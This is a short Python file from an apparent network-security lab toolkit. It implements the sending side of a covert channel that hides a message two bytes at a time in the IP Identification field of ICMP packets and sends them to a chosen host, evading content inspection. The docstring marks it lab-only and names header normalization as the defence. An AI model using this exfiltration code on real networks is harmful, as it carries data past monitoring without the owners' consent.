# SPDX-License-Identifier: MIT
# Copyright (c) 2026 Chris <goabonga@pm.me>

"""Attack side of netlab-covert: exfiltrate data in the IP ID field. LAB ONLY.

Sends packets whose IP Identification field carries two bytes of a hidden message
each; a receiver decodes them. Content inspection sees only ordinary traffic;
header normalization (see channel.py) destroys the channel.
"""

from __future__ import annotations

import argparse

from netlab_core import verdict
from netlab_core.sniffing import load_scapy

from netlab_covert.channel import encode


def run(args: argparse.Namespace) -> int:
    s = load_scapy()
    ids = encode(args.message.encode())
    print(f"[*] exfiltrating {args.message!r} in {len(ids)} IP ID fields to {args.dst}")
    for ip_id in ids:
        s.send(s.IP(dst=args.dst, id=ip_id) / s.ICMP(), verbose=0)
    verdict("ALERT", f"sent {len(ids)} covert packets")
    return 0
